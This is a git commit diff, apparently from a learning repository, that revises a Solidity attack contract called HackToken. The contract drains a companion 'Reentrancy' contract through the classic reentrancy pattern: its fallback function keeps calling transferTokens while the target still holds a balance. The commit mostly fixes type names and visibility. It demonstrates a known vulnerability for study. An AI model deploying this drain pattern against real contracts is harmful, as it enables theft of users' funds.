29a32ecf7ae6e11057a53293fd8a899d1535599e
balajipachai <balaji.pachai08@gmail.com>
2019-02-14 07:52:38 +0530

    Changes

--- contracts/HackTokens.sol
+++ contracts/HackTokens.sol
@@ -3,32 +3,27 @@ pragma solidity ^0.5.2;
 
 import "./Reentrancy.sol";
 /// @author Balaji Pachai
-/// @title HackToken
+/// @dev HackToken
 /// @dev A contract that pull in all the tokens from the Reentrancy contract
 contract HackToken {
-    Reentrancy public rentrancyAddress;
+    Reentrant public rentrancyAddress;
 
-    /// @title Constructor
     /// @dev constructor that sets the Reentrancy contract address
     constructor (address rentrancyContractAddress) public {
-        rentrancyAddress = Reentrancy(rentrancyContractAddress);
+        rentrancyAddress = Reentrant(rentrancyContractAddress);
     }
 
-    /// @title deposit
     /// @dev Function that deposits tokens into the Reentrancy contract
     function deposit(uint256 noOfTokens) public {
         rentrancyAddress.depositTokens(noOfTokens);
     }
 
-    /// @title transfer
     /// @dev Function that invokes re-entrancy transferTokens function
-    function transfer() payable {
+    function transfer() payable public {
         rentrancyAddress.transferTokens(1 ether);
     }
 
-    /// @title pullInTokens
     /// @dev Function that pulls in tokens from
-
     function() external payable { 
         if (rentrancyAddress.balance > 0 ) {
             rentrancyAddress.transferTokens(1 ether);
